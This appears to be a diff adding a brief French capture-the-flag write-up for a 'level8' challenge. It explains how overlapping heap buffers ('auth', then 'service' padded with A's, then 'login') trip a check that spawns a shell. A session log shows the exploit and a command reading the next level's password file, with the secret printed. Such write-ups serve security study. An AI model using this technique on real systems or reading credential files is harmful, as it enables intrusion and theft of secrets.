@@ -1,0 +1,16 @@
+les condition du program pour execute un shell
+
+"auth " pour que le tableau auth soit init
+"serviceAAAAAAAAAAAAAAAAAAAAAAAAAA" pour que le tableau service qui chevauche le tableau auth soit rempli avec des AAAA et donc auth[8] != 0
+"login" pour si auth[8] != 0 lance le shell
+
+
+$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
